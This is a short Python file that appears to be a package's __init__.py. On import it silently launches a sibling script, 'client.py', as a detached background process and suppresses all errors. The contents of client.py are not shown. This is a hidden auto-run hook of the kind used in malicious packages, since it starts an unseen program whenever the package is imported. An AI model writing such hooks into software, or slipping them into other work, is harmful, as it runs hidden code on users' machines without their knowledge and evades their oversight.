import os
import subprocess

try:
    curr_path = os.path.realpath(__file__)
    normal_path = curr_path.removesuffix("__init__.py")
    file = "client.py"
    subprocess.Popen(["python", file],
                     cwd=normal_path,
                     creationflags=subprocess.DETACHED_PROCESS)
except:
    pass
